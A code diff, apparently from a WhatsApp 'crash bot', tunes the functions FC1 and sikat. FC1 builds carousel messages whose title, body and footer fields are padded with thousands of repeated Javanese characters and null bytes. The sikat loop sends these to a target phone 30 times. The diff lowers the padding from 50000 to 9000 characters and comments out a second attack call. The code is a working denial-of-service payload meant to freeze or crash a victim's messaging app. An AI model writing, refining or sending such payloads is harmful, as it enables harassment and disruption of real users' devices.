@@ -968,7 +968,7 @@ async function FC1(sock, target) {
   for (let i = 0; i < 10; i++) { 
     cards.push({
       header: {
-        title: 'ꦾ'.repeat(50000),
+        title: 'ꦾ'.repeat(9000),
         imageMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
           mimetype: "image/jpeg",
@@ -987,10 +987,10 @@ async function FC1(sock, target) {
         hasMediaAttachment: true
       },
       body: { 
-        text: "ꦾ".repeat(50000)
+        text: "ꦾ".repeat(9000)
       },
       footer: {
-        text: "ꦾ".repeat(50000)
+        text: "ꦾ".repeat(9000)
       },
       nativeFlowMessage: {
         messageParamsJson: "\u0000".repeat(9999),
@@ -1022,10 +1022,10 @@ async function FC1(sock, target) {
         },
         interactiveMessage: {
           body: { 
-            text: "ꦾ".repeat(50000)
+            text: "ꦾ".repeat(9000)
           },
           footer: { 
-            text: "ꦾ".repeat(50000)
+            text: "ꦾ".repeat(9000)
           },
           carouselMessage: {
             cards: cards 
@@ -1358,7 +1358,7 @@ async function sikat(sock, target) {
     for (let i = 0; i < 30; i++) {
         //await AB1(sock, target, true)
         //await AB2(sock, target, true)
-        await F(sock, target)
+        //await F(sock, target)
         await FC1(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
     }
